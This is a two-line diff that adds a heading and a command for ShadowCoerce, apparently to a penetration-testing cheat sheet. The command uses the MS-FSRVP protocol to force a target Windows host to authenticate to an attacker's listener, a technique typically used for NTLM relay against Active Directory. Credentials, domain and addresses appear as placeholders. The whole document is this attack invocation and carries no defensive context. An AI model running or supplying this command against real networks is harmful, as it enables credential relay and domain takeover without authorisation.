@@ -1,0 +1,2 @@
+# ShadowCoerce — Coercion via MS-FSRVP
+python3 shadowcoerce.py -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_IP
